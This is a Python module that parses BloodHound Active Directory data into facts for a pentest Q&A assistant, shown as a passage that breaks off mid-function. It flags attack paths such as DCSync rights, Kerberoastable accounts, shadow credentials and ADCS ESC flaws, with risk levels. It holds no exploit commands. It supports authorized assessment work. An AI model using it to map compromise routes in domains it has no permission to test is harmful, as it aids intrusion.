"""
BloodHound Fact Extractor - Deterministic Pattern Extraction
Mirrors the Nmap fact extractor architecture for consistent anti-hallucination validation.

This module extracts hard facts from BloodHound JSON data and converts them to Q&A format
for RAG context, enabling precise answers with validation against extracted facts.

Author: Ask Syd Team
Version: 1.0
Date: 2026-01-04
"""

import json
import re
from typing import Dict, List, Any, Set, Tuple, Optional
from collections import defaultdict
from bloodhound_exploitation_commands import BloodHoundExploitationCommands


class BloodHoundFactExtractor:
    """
    Extracts comprehensive facts from BloodHound JSON output.
    Supports both old format (single 'data' array) and new format (separate users/computers/groups arrays).
    """

    # Well-known SIDs for identification
    WELL_KNOWN_SIDS = {
        'S-1-5-32-544': 'Administrators',
        'S-1-5-32-548': 'Account Operators',
        'S-1-5-32-549': 'Server Operators',
        'S-1-5-32-550': 'Print Operators',
        'S-1-5-32-551': 'Backup Operators',
        'S-1-5-32-555': 'Remote Desktop Users',
    }

    # ACE type descriptions and risk levels
    ACE_TYPES = {
        'genericall': {'name': 'GenericAll', 'risk': 'CRITICAL', 'desc': 'Full control over object'},
        'genericwrite': {'name': 'GenericWrite', 'risk': 'HIGH', 'desc': 'Can modify object attributes'},
        'writeowner': {'name': 'WriteOwner', 'risk': 'CRITICAL', 'desc': 'Can take ownership of object'},
        'writedacl': {'name': 'WriteDacl', 'risk': 'CRITICAL', 'desc': 'Can modify permissions'},
        'allextendedrights': {'name': 'AllExtendedRights', 'risk': 'HIGH', 'desc': 'All extended rights'},
        'forcechangepassword': {'name': 'ForceChangePassword', 'risk': 'HIGH', 'desc': 'Can reset password'},
        'addmember': {'name': 'AddMember', 'risk': 'HIGH', 'desc': 'Can add members to group'},
        'addkeycredentiallink': {'name': 'AddKeyCredentialLink', 'risk': 'CRITICAL', 'desc': 'Shadow Credentials attack'},
        'getchanges': {'name': 'GetChanges', 'risk': 'CRITICAL', 'desc': 'DCSync rights (part 1)'},
        'getchangesall': {'name': 'GetChangesAll', 'risk': 'CRITICAL', 'desc': 'DCSync rights (part 2)'},
        'readlapspassword': {'name': 'ReadLAPSPassword', 'risk': 'HIGH', 'desc': 'Can read LAPS passwords'},
        'readgmsapassword': {'name': 'ReadGMSAPassword', 'risk': 'HIGH', 'desc': 'Can read gMSA passwords'},
        'owns': {'name': 'Owns', 'risk': 'HIGH', 'desc': 'Owns the object'},
        'adminto': {'name': 'AdminTo', 'risk': 'HIGH', 'desc': 'Local admin rights'},
        'canrdp': {'name': 'CanRDP', 'risk': 'MEDIUM', 'desc': 'RDP access'},
        'canpsremote': {'name': 'CanPSRemote', 'risk': 'HIGH', 'desc': 'PowerShell remoting'},
        'executedcom': {'name': 'ExecuteDCOM', 'risk': 'HIGH', 'desc': 'DCOM execution rights'},
        'allowedtodelegate': {'name': 'AllowedToDelegate', 'risk': 'HIGH', 'desc': 'Constrained delegation'},
        'allowedtoact': {'name': 'AllowedToAct', 'risk': 'CRITICAL', 'desc': 'Resource-based constrained delegation'},
        'memberof': {'name': 'MemberOf', 'risk': 'INFO', 'desc': 'Group membership'},
        'hasession': {'name': 'HasSession', 'risk': 'MEDIUM', 'desc': 'Active user session'},
        'contains': {'name': 'Contains', 'risk': 'INFO', 'desc': 'Container relationship'},
        'trustedby': {'name': 'TrustedBy', 'risk': 'MEDIUM', 'desc': 'Trust relationship'},
        'sqladmin': {'name': 'SQLAdmin', 'risk': 'HIGH', 'desc': 'SQL Server admin'},
        'adcsesc1': {'name': 'ADCSESC1', 'risk': 'CRITICAL', 'desc': 'Certificate ESC1 vulnerability'},
        'adcsesc3': {'name': 'ADCSESC3', 'risk': 'CRITICAL', 'desc': 'Certificate ESC3 vulnerability'},
        'adcsesc4': {'name': 'ADCSESC4', 'risk': 'HIGH', 'desc': 'Certificate ESC4 vulnerability'},
        'adcsesc6': {'name': 'ADCSESC6', 'risk': 'CRITICAL', 'desc': 'Certificate ESC6 vulnerability'},
        'adcsesc8': {'name': 'ADCSESC8', 'risk': 'CRITICAL', 'desc': 'Certificate ESC8 vulnerability'},
    }

    # High-value target patterns
    HIGH_VALUE_PATTERNS = [
        'domain admins', 'enterprise admins', 'administrators', 'schema admins',
        'backup operators', 'account operators', 'server operators', 'print operators',
        'dns admins', 'krbtgt', 'administrator@'
    ]

    def __init__(self):
        """Initialize fact storage structure"""
        self.facts = {
            # Domain metadata
            'domain_name': None,
            'domain_sid': None,
            'functional_level': None,
            'collection_date': None,

            # Object counts
            'stats': {
                'total_users': 0,
                'enabled_users': 0,
                'disabled_users': 0,
                'total_computers': 0,
                'enabled_computers': 0,
                'disabled_computers': 0,
                'total_groups': 0,
                'total_ous': 0,
                'total_gpos': 0,
                'total_domains': 0,
            },

            # All objects (for validation)
            'all_users': [],
            'all_computers': [],
            'all_groups': [],
            'all_ous': [],
            'all_gpos': [],

            # High-value targets
            'domain_admins': [],
            'enterprise_admins': [],
            'administrators': [],
            'schema_admins': [],
            'backup_operators': [],
            'account_operators': [],
            'server_operators': [],
            'print_operators': [],
            'dns_admins': [],
            'krbtgt_account': None,
            'builtin_administrator': None,
            'admincount_users': [],
            'high_value_targets': [],

            # Domain Controllers
            'domain_controllers': [],

            # Computer details (IP addresses, OS versions) - for Q&A
            'computer_details': {},  # {computer_name: {ip, os, os_version, distinguishedname}}

            # Property-based vulnerabilities
            'kerberoastable': [],  # hasspn=true
            'asrep_roastable': [],  # dontreqpreauth=true
            'password_not_required': [],  # passwordnotreqd=true
            'password_never_expires': [],  # pwdneverexpires=true
            'unconstrained_delegation': [],  # unconstraineddelegation=true
            'constrained_delegation': [],  # allowedtodelegate
            'rbcd_targets': [],  # Resource-based constrained delegation
            'sensitive_not_delegated': [],  # Accounts that cannot be delegated
            'owned_principals': [],  # owned=true
            'disabled_but_sensitive': [],  # Disabled but high-value

            # ACL-based attack paths (edges/ACEs)
            'attack_paths': [],  # List of {source, target, relationship, risk, description}
            'dcsync_principals': [],  # Principals with DCSync rights
            'genericall_paths': [],  # GenericAll relationships
            'writedacl_paths': [],  # WriteDacl relationships
            'writeowner_paths': [],  # WriteOwner relationships
            'forcechangepassword_paths': [],  # ForceChangePassword relationships
            'addmember_paths': [],  # AddMember relationships
            'shadow_credentials_paths': [],  # AddKeyCredentialLink paths
            'laps_readers': [],  # ReadLAPSPassword rights
            'gmsa_readers': [],  # ReadGMSAPassword rights
            'adminto_paths': [],  # Local admin relationships
            'canrdp_paths': [],  # RDP access paths
            'canpsremote_paths': [],  # PSRemote access paths
            'sqladmin_paths': [],  # SQL admin access

            # Group memberships
            'group_members': {},  # {group_name: [member1, member2, ...]}
            'user_memberships': {},  # {user_name: [group1, group2, ...]}

            # Active sessions
            'sessions': [],  # {user, computer}
            'da_sessions_on_workstations': [],  # Critical: DA logged into workstation
            'admin_sessions': [],  # Any admin account session

            # Trust relationships
            'trusts': [],  # {source_domain, target_domain, type, direction}

            # GPO information
            'gpo_links': [],  # {gpo_name, linked_to}
            'gpo_permissions': [],  # Who can modify GPOs

            # Certificate Services (ADCS)
            'certificate_templates': [],
            'adcs_vulnerabilities': [],

            # Critical findings summary
            'critical_findings': [],
            'high_findings': [],
            'medium_findings': [],

            # PHASE 2: Pre-computed attack chains for complex queries
            'paths_to_da': [],  # Attack paths to Domain Admins {path: [node1, node2, ...], length: N, methods: []}
            'paths_to_ea': [],  # Attack paths to Enterprise Admins
            'paths_to_dc': [],  # Attack paths to Domain Controllers
            'paths_to_krbtgt': [],  # Attack paths to KRBTGT
            'shortest_path_to_da': None,  # Single shortest path to DA
            'fastest_domain_compromise': None,  # Fastest multi-hop chain
            'vulnerable_dcs': [],  # DCs with exploitable paths
        }

    def extract_facts(self, json_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Main extraction method - deterministically extracts ALL facts from BloodHound JSON.

        Args:
            json_data: Parsed BloodHound JSON (dict)

        Returns:
            Dictionary containing all extracted facts
        """
        # Reset facts to prevent stale data from previous analyses
        self.__init__()

        # Handle root-level list format (some exporters produce [{...}, {...}])
        if isinstance(json_data, list):
            objects = json_data
            sid_to_name = self._build_sid_mapping(objects)
            for obj in objects:
                obj_type = self._get_object_type(obj)
                if obj_type == 'User':
                    self._process_user(obj, sid_to_name)
                elif obj_type == 'Computer':
                    self._process_computer(obj, sid_to_name)
                elif obj_type == 'Group':
                    self._process_group(obj, sid_to_name)
                elif obj_type == 'OU':
                    self._process_ou(obj)
                elif obj_type == 'GPO':
                    self._process_gpo(obj)
                elif obj_type == 'Domain':
                    self._process_domain(obj)
            for obj in objects:
                self._process_aces(obj, sid_to_name)
            self._process_sessions()
            self._detect_kerberoastable()
            self._detect_asreproastable()
            return self.facts

        # Extract metadata if present
        self._extract_metadata(json_data)

        # Handle new format: separate arrays with known types
        if any(key in json_data for key in ['users', 'computers', 'groups', 'ous', 'gpos', 'domains']):
            # Process each array separately with known type
            all_objects = []

            # Build SID mapping first
            for obj in json_data.get('users', []):
                all_objects.append(obj)
            for obj in json_data.get('computers', []):
                all_objects.append(obj)
            for obj in json_data.get('groups', []):
                all_objects.append(obj)
            for obj in json_data.get('ous', []):
                all_objects.append(obj)
            for obj in json_data.get('gpos', []):
                all_objects.append(obj)
            for obj in json_data.get('domains', []):
                all_objects.append(obj)

            sid_to_name = self._build_sid_mapping(all_objects)

            # Process users
            for obj in json_data.get('users', []):
                self._process_user(obj, sid_to_name)

            # Process computers
            for obj in json_data.get('computers', []):
                self._process_computer(obj, sid_to_name)

            # Process groups
            for obj in json_data.get('groups', []):
                self._process_group(obj, sid_to_name)

            # Process OUs
            for obj in json_data.get('ous', []):
                self._process_ou(obj)

            # Process GPOs
            for obj in json_data.get('gpos', []):
                self._process_gpo(obj)

            # Process domains
            for obj in json_data.get('domains', []):
                self._process_domain(obj)

            # Process all objects for ACEs
            for obj in all_objects:
                self._process_aces(obj, sid_to_name)

        else:
            # Handle old format: single 'data' array or root array
            objects = self._normalize_json_format(json_data)
            sid_to_name = self._build_sid_mapping(objects)

            # First pass: Extract object properties and classify
            for obj in objects:
                obj_type = self._get_object_type(obj)

                if obj_type == 'User':
                    self._process_user(obj, sid_to_name)
                elif obj_type == 'Computer':
                    self._process_computer(obj, sid_to_name)
                elif obj_type == 'Group':
                    self._process_group(obj, sid_to_name)
                elif obj_type == 'OU':
                    self._process_ou(obj)
                elif obj_type == 'GPO':
                    self._process_gpo(obj)
                elif obj_type == 'Domain':
                    self._process_domain(obj)

            # Second pass: Process ACLs and attack paths
            for obj in objects:
                self._process_aces(obj, sid_to_name)

        # Process sessions (separate array in some formats)
        if 'sessions' in json_data:
            self._process_sessions(json_data['sessions'])

        # Process explicit ACLs array (new format)
        if 'acls' in json_data:
            self._process_acls_array(json_data['acls'])

        # CRITICAL FIX: Process "links" array (user's JSON format)
        if 'links' in json_data:
            # Need to rebuild sid_to_name from the objects
            if 'data' in json_data:
                objects = json_data['data']
            else:
                objects = []
                for key in ['users', 'computers', 'groups']:
                    if key in json_data:
                        objects.extend(json_data[key])

            sid_to_name = self._build_sid_mapping(objects)
            self._process_links_array(json_data['links'], sid_to_name)

        # Post-processing: Extract domain name if not already set
        if not self.facts['domain_name']:
            # Try to extract from computer details
            for comp_name in self.facts['all_computers']:
                if '@' in comp_name:
                    self.facts['domain_name'] = comp_name.split('@')[1]
                    break
                elif '.' in comp_name:
                    # Extract from FQDN (e.g., DC01.CORP.LOCAL -> CORP.LOCAL)
                    parts = comp_name.split('.', 1)
                    if len(parts) > 1:
                        self.facts['domain_name'] = parts[1]
                        break

            # If still not found, try users
            if not self.facts['domain_name']:
                for user_name in self.facts['all_users']:
                    if '@' in user_name:
                        self.facts['domain_name'] = user_name.split('@')[1]
                        break

        # Identify critical findings
        self._identify_critical_findings()

        # Build attack path chains (multi-hop)
        self._build_attack_chains()

        return self.facts

    def _normalize_json_format(self, json_data: Dict[str, Any]) -> List[Dict]:
        """
        Handle multiple BloodHound JSON formats and return normalized object list.

        Formats supported:
        1. Old format: {"data": [{...}, {...}]} or {"Data": [...]}
        2. New format: {"users": [...], "computers": [...], "groups": [...]}
        3. Mixed format
        4. Mixed case (Data, Users, Links, etc.)
        """
        objects = []

        # Create case-insensitive key lookup
        keys_lower = {k.lower(): k for k in json_data.keys()}

        # New format: separate arrays (case-insensitive)
        array_keys = ['users', 'computers', 'groups', 'ous', 'gpos', 'domains']
        for key_lower in array_keys:
            actual_key = keys_lower.get(key_lower)
            if actual_key and isinstance(json_data[actual_key], list):
                objects.extend(json_data[actual_key])

        # Old format: single data array (case-insensitive)
        data_key = keys_lower.get('data')
        if data_key and isinstance(json_data[data_key], list):
            objects.extend(json_data[data_key])

        # Handle if root is an array
        if isinstance(json_data, list):
            objects = json_data

        return objects

    def _extract_metadata(self, json_data: Dict[str, Any]) -> None:
        """Extract metadata from JSON"""
        if 'meta' in json_data:
            meta = json_data['meta']
            self.facts['collection_date'] = meta.get('collection_date')
            self.facts['functional_level'] = meta.get('functional_level')

    def _build_sid_mapping(self, objects: List[Dict]) -> Dict[str, str]:
        """Build SID to name mapping for ACL resolution"""
        sid_map = {}

        for obj in objects:
            obj_id = obj.get('ObjectIdentifier', '')
            props = obj.get('Properties', {})

            # Try multiple name fields
            name = (obj.get('Name') or
                   props.get('name') or
                   props.get('samaccountname') or
                   props.get('displayname'))

            if obj_id and name:
                sid_map[obj_id] = name

        # Add well-known SIDs
        sid_map.update(self.WELL_KNOWN_SIDS)

        return sid_map

    def _get_object_type(self, obj: Dict) -> str:
        """Determine object type from various fields"""
        # Try explicit type fields (case-insensitive)
        obj_type = (obj.get('Kind') or
                   obj.get('Type') or
                   obj.get('type') or  # CRITICAL FIX: Check lowercase 'type'
                   obj.get('ObjectType') or
                   obj.get('Properties', {}).get('objecttype'))

        if obj_type:
            # Normalize type string for consistent matching
            # Use upper() mapping to preserve acronyms like GPO, OU
            if isinstance(obj_type, str):
                type_map = {
                    'user': 'User', 'group': 'Group', 'computer': 'Computer',
                    'domain': 'Domain', 'gpo': 'GPO', 'ou': 'OU',
                    'container': 'Container', 'base': 'Base',
                }
                return type_map.get(obj_type.lower(), obj_type)
            return obj_type

        # Infer from properties
        props = obj.get('Properties', {})
        name = props.get('name', '').upper()
        obj_id = obj.get('ObjectIdentifier', '')

        # Computer - has operatingsystem or distinguishedname with CN=...,OU=Domain Controllers
        if 'operatingsystem' in props or 'dnshostname' in props:
            return 'Computer'

        # GPO
        if 'gpcfilesyspath' in props:
            return 'GPO'

        # OU
        if props.get('distinguishedname', '').startswith('OU='):
            return 'OU'

        # Domain
        if 'trusts' in obj or (name and name.endswith('.LOCAL') and '@' not in name):
            return 'Domain'

        # Group - check for well-known group SIDs or group-like names
        well_known_group_rids = ['-512', '-513', '-514', '-515', '-516', '-517', '-518', '-519', '-520',
                                  '-521', '-522', '-525', '-526', '-527', '-544', '-545', '-546', '-547',
                                  '-548', '-549', '-550', '-551', '-552', '-553', '-554', '-555', '-556',
                                  '-557', '-558', '-559', '-560', '-561', '-562', '-568', '-569', '-573',
                                  '-574', '-575', '-576']

        is_well_known_group = any(obj_id.endswith(rid) for rid in well_known_group_rids)

        group_keywords = ['ADMINS', 'ADMINISTRATORS', 'OPERATORS', 'USERS', 'GUESTS', 'SCHEMA']
        has_group_name = any(keyword in name for keyword in group_keywords)

        has_members_field = 'members' in obj or 'Members' in obj

        if is_well_known_group or has_members_field or (has_group_name and '@' in name):
            return 'Group'

        # User - has user-specific properties OR name with @ and not a group/computer
        user_properties = ['samaccountname', 'lastlogon', 'pwdlastset', 'badpwdcount', 'logoncount',
                          'hasspn', 'dontreqpreauth', 'passwordnotreqd', 'serviceprincipalnames']

        has_user_property = any(prop in props for prop in user_properties)

        # If has @ and not identified as group/computer, likely a user
        if has_user_property or ('@' in name and not is_well_known_group and 'operatingsystem' not in props):
            return 'User'

        return 'Unknown'

    def _get_name(self, obj: Dict) -> str:
        """Extract name from object (handles multiple formats)"""
        props = obj.get('Properties', {})

        name = (obj.get('Name') or
               props.get('name') or
               props.get('samaccountname') or
               props.get('displayname') or
               obj.get('ObjectIdentifier', 'UNKNOWN'))

        return name

    def _process_user(self, obj: Dict, sid_map: Dict[str, str]) -> None:
        """Process user object and extract all relevant facts"""
        props = obj.get('Properties', {})
        name = self._get_name(obj)
        name_lower = name.lower()

        # Add to all users list
        self.facts['all_users'].append(name)

        # Statistics
        self.facts['stats']['total_users'] += 1
        if props.get('enabled', True):
            self.facts['stats']['enabled_users'] += 1
        else:
            self.facts['stats']['disabled_users'] += 1

        # High-value target identification
        if props.get('admincount'):
            self.facts['admincount_users'].append(name)

        if props.get('highvalue'):
            self.facts['high_value_targets'].append(name)

        if 'krbtgt' in name_lower:
            self.facts['krbtgt_account'] = name

        if 'administrator@' in name_lower and not 'domain admins' in name_lower:
            self.facts['builtin_administrator'] = name

        # Property-based vulnerabilities (only if enabled)
        is_enabled = props.get('enabled', True)

        if is_enabled:
            # CRITICAL FIX: Check serviceprincipalnames array OR hasspn flag
            spns = props.get('serviceprincipalnames', [])
            has_spn = props.get('hasspn', False) or (spns and len(spns) > 0)

            if has_spn:
                self.facts['kerberoastable'].append({
                    'account': name,
                    'spns': spns[:5] if spns else ['<SPN set>']  # Limit to 5 for readability
                })

            if props.get('dontreqpreauth'):
                self.facts['asrep_roastable'].append(name)

            if props.get('passwordnotreqd'):
                self.facts['password_not_required'].append(name)

            if props.get('pwdneverexpires'):
                self.facts['password_never_expires'].append(name)

            if props.get('unconstraineddelegation'):
                self.facts['unconstrained_delegation'].append(name)

            allowed_to_delegate = props.get('allowedtodelegate', [])
            if allowed_to_delegate:
                self.facts['constrained_delegation'].append({
                    'account': name,
                    'targets': allowed_to_delegate[:5]
                })

            if props.get('allowedtoact'):
                self.facts['rbcd_targets'].append(name)

        if props.get('sensitive') or props.get('sensitiveandcannotbedelegated'):
            self.facts['sensitive_not_delegated'].append(name)

        if props.get('owned'):
            self.facts['owned_principals'].append(name)

        # Disabled but sensitive
        if not is_enabled and (props.get('admincount') or props.get('highvalue')):
            self.facts['disabled_but_sensitive'].append(name)

    def _process_computer(self, obj: Dict, sid_map: Dict[str, str]) -> None:
        """Process computer object"""
        props = obj.get('Properties', {})
        name = self._get_name(obj)
        name_lower = name.lower()

        # Add to all computers list
        self.facts['all_computers'].append(name)

        # Statistics
        self.facts['stats']['total_computers'] += 1
        if props.get('enabled', True):
            self.facts['stats']['enabled_computers'] += 1
        else:
            self.facts['stats']['disabled_computers'] += 1

        # CRITICAL FIX: Extract computer details (IP, OS, OS version) for Q&A
        ip_address = props.get('ipaddress', props.get('ip', None))
        os_name = props.get('operatingsystem', '')
        os_version = props.get('operatingsystemversion', '')
        distinguished_name = props.get('distinguishedname', '')

        if ip_address or os_name or os_version:
            self.facts['computer_details'][name] = {
                'ip': ip_address,
                'os': os_name,
                'os_version': os_version,
                'distinguishedname': distinguished_name
            }

        # Domain Controller identification
        is_dc = (props.get('isdc') or
                'domain controller' in props.get('operatingsystem', '').lower() or
                'domain controllers' in props.get('distinguishedname', '').lower())

        if is_dc:
            self.facts['domain_controllers'].append(name)

        # High-value
        if props.get('highvalue'):
            self.facts['high_value_targets'].append(name)

        # Unconstrained delegation (extract ALL - DC vs non-DC distinction handled in facts_to_text)
        if props.get('unconstraineddelegation'):
            self.facts['unconstrained_delegation'].append(name)

        # Constrained delegation
        allowed_to_delegate = props.get('allowedtodelegate', [])
        if allowed_to_delegate:
            self.facts['constrained_delegation'].append({
                'account': name,
                'targets': allowed_to_delegate[:5]
            })

        # RBCD
        if props.get('allowedtoact'):
            self.facts['rbcd_targets'].append(name)

        if props.get('owned'):
            self.facts['owned_principals'].append(name)

    def _process_group(self, obj: Dict, sid_map: Dict[str, str]) -> None:
        """Process group object and extract memberships"""
        props = obj.get('Properties', {})
        name = self._get_name(obj)
        name_lower = name.lower()

        # Add to all groups list
        self.facts['all_groups'].append(name)

        # Statistics
        self.facts['stats']['total_groups'] += 1

        # Extract members
        members = []

        # Handle different member formats
        if 'Members' in obj:
            for member in obj['Members']:
                member_name = (member.get('MemberName') or
                             member.get('ObjectIdentifier') or
                             str(member))

                # Resolve SID if needed
                if member_name.startswith('S-1-'):
                    member_name = sid_map.get(member_name, member_name)

                members.append(member_name)

        # Store group membership
        if members:
            self.facts['group_members'][name] = members

            # Build reverse mapping (user -> groups)
            for member in members:
                if member not in self.facts['user_memberships']:
                    self.facts['user_memberships'][member] = []
                self.facts['user_memberships'][member].append(name)

        # Identify high-value groups
        if 'domain admins' in name_lower:
            self.facts['domain_admins'] = members
        elif 'enterprise admins' in name_lower:
            self.facts['enterprise_admins'] = members
        elif name_lower == 'administrators' or 'administrators@' in name_lower:
            self.facts['administrators'] = members
        elif 'schema admins' in name_lower:
            self.facts['schema_admins'] = members
        elif 'backup operators' in name_lower:
            self.facts['backup_operators'] = members
        elif 'account operators' in name_lower:
            self.facts['account_operators'] = members
        elif 'server operators' in name_lower:
            self.facts['server_operators'] = members
        elif 'print operators' in name_lower:
            self.facts['print_operators'] = members
        elif 'dns admins' in name_lower:
            self.facts['dns_admins'] = members

        if props.get('highvalue'):
            self.facts['high_value_targets'].append(name)

    def _process_ou(self, obj: Dict) -> None:
        """Process Organizational Unit"""
        name = self._get_name(obj)
        self.facts['all_ous'].append(name)
        self.facts['stats']['total_ous'] += 1

    def _process_gpo(self, obj: Dict) -> None:
        """Process Group Policy Object"""
        name = self._get_name(obj)
        self.facts['all_gpos'].append(name)
        self.facts['stats']['total_gpos'] += 1

    def _process_domain(self, obj: Dict) -> None:
        """Process Domain object"""
        props = obj.get('Properties', {})
        name = self._get_name(obj)

        if not self.facts['domain_name']:
            self.facts['domain_name'] = name

        if not self.facts['domain_sid'] and obj.get('ObjectIdentifier'):
            self.facts['domain_sid'] = obj['ObjectIdentifier']

        self.facts['stats']['total_domains'] += 1

    def _is_noise_path(self, source: str, target: str) -> bool:
        """
        Filter noise paths - permissions from high-privilege principals are expected.

        PROFESSIONAL STANDARD: Pentesters don't care that Domain Admins can do anything.
        Filter out paths where source has Domain/Enterprise Admin privileges UNLESS
        target is a critical asset (KRBTGT, DC, etc.) where even admin paths matter.

        Args:
            source: Principal name (e.g., "DOMAIN ADMINS@DOMAIN.LOCAL")
            target: Target object name

        Returns:
            True if path should be filtered as noise, False if it's a real finding
        """
        # Normalize for comparison
        source_lower = source.lower()
        target_lower = target.lower()

        # Well-known SIDs for high-privilege groups (always noise)
        # S-1-5-21-[domain]-512 = Domain Admins
        # S-1-5-21-[domain]-519 = Enterprise Admins
        # S-1-5-32-544 = Built-in Administrators
        noise_sids = ['-512', '-519', '-544']
        has_noise_sid = any(sid in source for sid in noise_sids)

        # High-privilege groups that create noise
        # Use exact group name matching (before @domain) to avoid false positives
        # e.g., "SQLADMINISTRATOR@CORP.LOCAL" should NOT be filtered
        noise_groups_exact = [
            'domain admins',
            'enterprise admins',
            'administrators',       # Built-in Administrators group (exact name)
            'administrator',        # Built-in Administrator account (exact name)
            'domain controllers',   # DCs can do anything in domain
        ]

        # Extract the name part before @domain for exact matching
        source_name = source_lower.split('@')[0].strip() if '@' in source_lower else source_lower
        is_noise_source = has_noise_sid or source_name in noise_groups_exact

        if not is_noise_source:
            return False  # Not noise - keep this path

        # Exception: Paths TO critical targets are still interesting even from DA/EA
        # because they show what DA/EA can directly compromise
        critical_targets = [
            'krbtgt',
            'domain controllers',
            'enterprise admins',
            'schema admins',
            'key admins',
        ]

        is_critical_target = any(ct in target_lower for ct in critical_targets)

        if is_critical_target:
            return False  # Keep paths to critical targets even from DA/EA

        # Otherwise, filter as noise
        return True

    def _process_aces(self, obj: Dict, sid_map: Dict[str, str]) -> None:
        """Process ACEs (Access Control Entries) for attack paths"""
        aces = obj.get('Aces', [])
        target_name = self._get_name(obj)

        for ace in aces:
            # Get principal (source of permission)
            principal_sid = ace.get('PrincipalSID', '')
            principal_name = ace.get('PrincipalName', '')

            if not principal_name and principal_sid:
                principal_name = sid_map.get(principal_sid, principal_sid)

            # Get right/permission type
            right_name = ace.get('RightName', '')
            right_lower = right_name.lower()

            # Skip if inherited (optional - can include if needed)
            # is_inherited = ace.get('IsInherited', False)
            # if is_inherited:
            #     continue

            # Get ACE metadata
            ace_info = self.ACE_TYPES.get(right_lower, {
                'name': right_name,
                'risk': 'LOW',
                'desc': right_name
            })

            # Create attack path record
            attack_path = {
                'source': principal_name,
                'target': target_name,
                'relationship': ace_info['name'],
                'risk': ace_info['risk'],
                'description': ace_info['desc'],
            }

            # PROFESSIONAL FILTER: Skip noise paths (DA/EA → anything expected)
            if self._is_noise_path(principal_name, target_name):
                continue  # Skip this path - it's noise, not a finding

            # Add to general attack paths
            if ace_info['risk'] in ['CRITICAL', 'HIGH', 'MEDIUM']:
                self.facts['attack_paths'].append(attack_path)

            # Add to specific categories
            if right_lower in ['getchanges', 'getchangesall']:
                self.facts['dcsync_principals'].append(principal_name)

            if right_lower == 'genericall':
                self.facts['genericall_paths'].append(attack_path)

            if right_lower == 'writedacl':
                self.facts['writedacl_paths'].append(attack_path)

            if right_lower == 'writeowner':
                self.facts['writeowner_paths'].append(attack_path)

            if right_lower == 'forcechangepassword':
                self.facts['forcechangepassword_paths'].append(attack_path)

            if right_lower == 'addmember':
                self.facts['addmember_paths'].append(attack_path)

            if right_lower == 'addkeycredentiallink':
                self.facts['shadow_credentials_paths'].append(attack_path)

            if right_lower == 'readlapspassword':
                self.facts['laps_readers'].append(principal_name)

            if right_lower == 'readgmsapassword':
                self.facts['gmsa_readers'].append(principal_name)

            if right_lower == 'adminto':
                self.facts['adminto_paths'].append(attack_path)

            if right_lower == 'canrdp':
                self.facts['canrdp_paths'].append(attack_path)

            if right_lower == 'canpsremote':
                self.facts['canpsremote_paths'].append(attack_path)

            if right_lower == 'sqladmin':
                self.facts['sqladmin_paths'].append(attack_path)

            if right_lower == 'allowedtodelegate':
                self.facts['constrained_delegation'].append({
                    'account': principal_name,
                    'targets': [target_name]
                })

    def _process_acls_array(self, acls: List[Dict]) -> None:
        """Process separate ACLs array (new BloodHound format)"""
        for acl in acls:
            principal_name = acl.get('PrincipalName', 'UNKNOWN')
            target_name = acl.get('ObjectName', 'UNKNOWN')
            right_name = acl.get('RightName', '')
            right_lower = right_name.lower()

            # Get ACE metadata
            ace_info = self.ACE_TYPES.get(right_lower, {
                'name': right_name,
                'risk': 'LOW',
                'desc': right_name
            })

            # Create attack path record
            attack_path = {
                'source': principal_name,
                'target': target_name,
                'relationship': ace_info['name'],
                'risk': ace_info['risk'],
                'description': ace_info['desc'],
            }

            # PROFESSIONAL FILTER: Skip noise paths (DA/EA → anything expected)
            if self._is_noise_path(principal_name, target_name):
                continue  # Skip this path - it's noise, not a finding

            # Add to general attack paths
            if ace_info['risk'] in ['CRITICAL', 'HIGH', 'MEDIUM']:
                self.facts['attack_paths'].append(attack_path)

            # Add to specific categories (same as _process_aces)
            if right_lower in ['getchanges', 'getchangesall']:
                if principal_name not in self.facts['dcsync_principals']:
                    self.facts['dcsync_principals'].append(principal_name)

            if right_lower == 'genericall':
                self.facts['genericall_paths'].append(attack_path)

            if right_lower == 'addmember':
                self.facts['addmember_paths'].append(attack_path)

            if right_lower == 'adminto':
                self.facts['adminto_paths'].append(attack_path)

            if right_lower == 'writedacl':
                self.facts['writedacl_paths'].append(attack_path)

            if right_lower == 'writeowner':
                self.facts['writeowner_paths'].append(attack_path)

            if right_lower == 'forcechangepassword':
                self.facts['forcechangepassword_paths'].append(attack_path)

            if right_lower == 'addkeycredentiallink':
                self.facts['shadow_credentials_paths'].append(attack_path)

            if right_lower == 'readlapspassword':
                self.facts['laps_readers'].append(attack_path)

            if right_lower == 'readgmsapassword':
                self.facts['gmsa_readers'].append(attack_path)

            if right_lower == 'canrdp':
                self.facts['canrdp_paths'].append(attack_path)

            if right_lower == 'canpsremote':
                self.facts['canpsremote_paths'].append(attack_path)

            if right_lower == 'sqladmin':
                self.facts['sqladmin_paths'].append(attack_path)

            if right_lower == 'allowedtodelegate':
                self.facts['constrained_delegation'].append({
                    'account': principal_name,
                    'targets': [target_name]
                })

    def _resolve_sid(self, sid: str, sid_map: Dict[str, str]) -> str:
        """Resolve SID to name using well-known SIDs and mapping"""
        # Well-known SIDs
        WELL_KNOWN_SIDS = {
            'S-1-1-0': 'Everyone',
            'S-1-5-11': 'Authenticated Users',
            'S-1-5-32-544': 'Administrators',
            'S-1-5-32-545': 'Users',
            'S-1-5-32-551': 'Backup Operators',
        }

        # Check well-known SIDs
        if sid in WELL_KNOWN_SIDS:
            return WELL_KNOWN_SIDS[sid]

        # Check domain-specific pattern
        if '-S-1-5-32-' in sid:
            base_sid = sid.split('-', 1)[1]
            if base_sid in WELL_KNOWN_SIDS:
                return WELL_KNOWN_SIDS[base_sid]

        # Check our mapping
        if sid in sid_map:
            return sid_map[sid]

        # Last resort: return SID
        return sid

    def _process_links_array(self, links: List[Dict], sid_to_name: Dict[str, str]) -> None:
        """
        Process "links" array (user's JSON format with source/target/relationship).
        Critical fix for attack paths not showing up.
        """
        for link in links:
            source_sid = link.get('source', '')
            target_sid = link.get('target', '')
            relationship = link.get('relationship', link.get('label', ''))

            # Resolve SIDs to names
            principal_name = self._resolve_sid(source_sid, sid_to_name)
            target_name = self._resolve_sid(target_sid, sid_to_name)

            if not principal_name or not target_name or not relationship:
                continue

            right_lower = relationship.lower()

            # Get ACE metadata
            ace_info = self.ACE_TYPES.get(right_lower, {
                'name': relationship,
                'risk': 'MEDIUM',  # Default to MEDIUM if not in ACE_TYPES
                'desc': relationship
            })

            # Create attack path record
            attack_path = {
                'source': principal_name,
                'target': target_name,
                'relationship': ace_info['name'],
                'risk': ace_info['risk'],
                'description': ace_info['desc'],
            }

            # PROFESSIONAL FILTER: Skip noise paths (DA/EA -> anything expected)
            if self._is_noise_path(principal_name, target_name):
                continue

